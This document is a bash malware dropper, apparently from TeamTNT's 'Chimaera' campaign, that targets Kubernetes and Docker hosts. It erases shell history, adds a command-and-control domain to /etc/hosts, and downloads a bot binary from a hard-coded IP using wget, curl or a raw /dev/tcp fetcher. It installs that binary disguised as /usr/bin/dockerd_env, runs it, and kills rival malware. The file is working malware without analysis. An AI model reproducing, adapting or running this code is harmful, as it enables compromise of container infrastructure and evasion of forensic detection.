#!/bin/bash
#
#	TITLE:		Chimaera_Kubernetes_root_PayLoad_1
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	Chimaera_stable_V1.00.1
#	DATE:		12.08.2021
#
#	SRC:        http://chimaera.cc/cmd/Kubernetes_root_PayLoad_1.sh
#
########################################################################

export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null

if [ "$(uname -m)" = "aarch64" ]; then C_hg_SYS="aarch64"
elif [ "$(uname -m)" = "x86_64" ];  then C_hg_SYS="x86_64"
elif [ "$(uname -m)" = "i386" ];    then C_hg_SYS="i386"
else C_hg_SYS="i386"; fi

export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin
BOT_BIN_URL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../TNTb/$C_hg_SYS"

cat /etc/hosts 2>/dev/null | grep '45.9.148.108 chimaera.cc' 2>/dev/null 1>/dev/null || echo '45.9.148.108 chimaera.cc' >> /etc/hosts


function C_hg_PACK_SETUP(){
BINARY=$1
APKPACK=$2
APTPACK=$3
YUMPACK=$4
if ! type $BINARY 2>/dev/null 1>/dev/null; then 
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add $APKPACK 2>/dev/null 1>/dev/null ; fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK --reinstall 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y $YUMPACK 2>/dev/null 1>/dev/null; yum reinstall -y $YUMPACK 2>/dev/null 1>/dev/null ; fi
fi
}

function C_hg_DLOAD() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

C_hg_PACK_SETUP curl curl curl curl
if ! type curl 2>/dev/null 1>/dev/null; then C_hg_DLOAD $HTTP_BASE_URL/bin/curl/$(uname -m) > /usr/bin/curl;chmod 755 /usr/bin/curl; fi

########################################################################

if [ ! -f "/usr/bin/dockerd_env" ];then
	if [ ! -f "/usr/bin/dockerd_env" ];then wget -q -O /usr/bin/dockerd_env $BOT_BIN_URL; fi	
	if [ ! -f "/usr/bin/dockerd_env" ];then curl -sLk -o /usr/bin/dockerd_env $BOT_BIN_URL; fi	
	if [ ! -f "/usr/bin/dockerd_env" ];then C_hg_DLOAD $BOT_BIN_URL > /usr/bin/dockerd_env; fi	
		if [ -f "/usr/bin/dockerd_env" ];then	
		chattr -ia /usr/bin/dockerd_env 2>/dev/null 1>/dev/null
		chmod +x /usr/bin/dockerd_env 2>/dev/null 1>/dev/null
		chmod 755 /usr/bin/dockerd_env 2>/dev/null 1>/dev/null
		fi
fi

if [ -f "/usr/bin/dockerd_env" ];then
	CHECK_BOT_PID=$(pidof /usr/bin/dockerd_env)
	if [ -z "$CHECK_BOT_PID" ]; then
	chmod +x /usr/bin/dockerd_env 2>/dev/null 1>/dev/null
	/usr/bin/dockerd_env ; fi
fi

chattr -ia ~/.dockerd /.dockerd ~/.configures /.configures /usr/bin/.kube /usr/sbin/.kube 2>/dev/null 1>/dev/null
	rm -f ~/.dockerd /.dockerd ~/.configures /.configures /usr/bin/.kube /usr/sbin/.kube 2>/dev/null 1>/dev/null
		pkill '\.dockerd' 2>/dev/null 1>/dev/null
		pkill '\.kube' 2>/dev/null 1>/dev/null
		pkill '\.configures' 2>/dev/null 1>/dev/null

rm -f k31r.sh 2>/dev/null
